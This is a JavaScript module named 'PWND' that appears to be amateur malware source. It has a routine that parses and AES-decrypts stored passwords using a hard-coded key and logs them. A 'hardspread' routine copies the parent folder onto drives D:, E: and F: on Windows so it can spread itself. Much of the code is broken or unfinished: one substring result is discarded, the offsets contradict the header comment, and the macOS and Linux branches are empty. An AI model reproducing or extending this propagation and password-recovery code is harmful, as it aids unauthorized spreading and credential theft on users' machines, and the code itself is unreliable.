/** Theory behind:
  * Init Vect is char 4 to 20
  * Password (encrypted) is 21 to string.length-16
  */
const aes = require('aes-js');
const { copySync } = require('fs-extra');
  sys_check = require("./sys_check");

class PWND {
    constructor() {}

    /**
      * @param {String} string
      */
    static async fndEnc(string) {
        let init_vect;
        function findInit() {
          let thing = String(string)
          thing.substr(0,3);
          init_vect = thing.substr(17, thing.length);
        }
        findInit(string);
        let endStr = String(string);
        let pass2 = endStr;
        console.log("Password Encrypted:", pass2);
        console.log("Initial Vector", init_vect)
        return init_vect;
    }

    static async decrypt(pass) {
        String(pass);
        // An example 128-bit key (16 bytes * 8 bits/byte = 128 bits)
        var key = [ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 ];

        // Convert text to bytes
        var text = pass.toString("utf-8");
        console.log(text)
        // When ready to decrypt the hex string, convert it to bytes
        var encryptedBytes = aes.utils.hex.toBytes(text);

        // The counter mode of operation maintains internal state, so to
        // decrypt a new instance must be instantiated.
        var aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(5));
        var decryptedBytes = aesCtr.decrypt(encryptedBytes);

        // Convert our bytes back into text
        var decryptedText = aes.utils.utf8.fromBytes(decryptedBytes);

        return console.log("Decrypted password: ", decryptedText);
    }

    static async hardspread() {
        if (/win32/gi.test(process.platform)) {
          try {
            copySync("../", "D:/");
          } catch (e) {
            console.log("Drive D: doesn't exist, trying new drive")
            copySync("../", "E:/");
          } finally {
            copySync("../", "F:/");
          }
        } else if ((/darwin/gi).test(process.platform)) {

        } else if ((/linux/gi).test(process.platform)) {

        } else {
          throw new Error("Unknown System Platform!!! exiting now!"), process.exit(1);
        }

    }
}

module.exports = PWND;
